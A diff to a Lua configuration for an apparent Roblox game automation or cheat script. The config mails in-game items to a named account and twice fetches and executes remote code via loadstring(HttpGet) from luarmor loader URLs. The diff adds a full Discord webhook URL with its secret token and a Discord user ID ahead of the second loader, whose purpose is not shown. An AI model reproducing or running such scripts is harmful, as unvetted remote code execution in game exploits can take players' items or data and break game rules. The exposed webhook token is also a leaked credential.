@@ -13,9 +13,7 @@ getgenv().config = {
     renderer = false,
     
     mailUsers = {
-        "Username1", -- change to your usernames for mailing
-        "Username2", -- YOU CAN PUT AS MANY ACCOUNTS AS YOU WANT
-        "Username3",
+        "zBossPT",
     },
     mailSetting = "Magic Shard", -- can be "Huge Poseidon Corgi", "Diamonds", "Magic Shard", "Charm Stone"
     mailAmount = 1, -- amount to mail, less than 1000.  For GEMS it will send all except 100k
@@ -23,6 +21,13 @@ getgenv().config = {
     mailAuto = false, -- true/false
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2a7ace7d651c472352ea0589cc6c570e.lua"))()
+
+wait(30)
+
+_G.WebhookURL = "https://discord.com/api/webhooks/1204257224659050496/PQDyrH_ZHyY9eMlSHVRK0W5DFOJFxWK9gUieUiXOvrVbN8J4lA_8ScjzsDOyar4y7bCZ" -- you webhook URL   
+_G.DiscUserID = "228318677953413120" -- your discord ID
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d68b8e56fab88bf7d726a7690f48b72b.lua"))()
 
 setfpscap(3)
 --game:GetService("RunService"):Set3dRenderingEnabled(false)
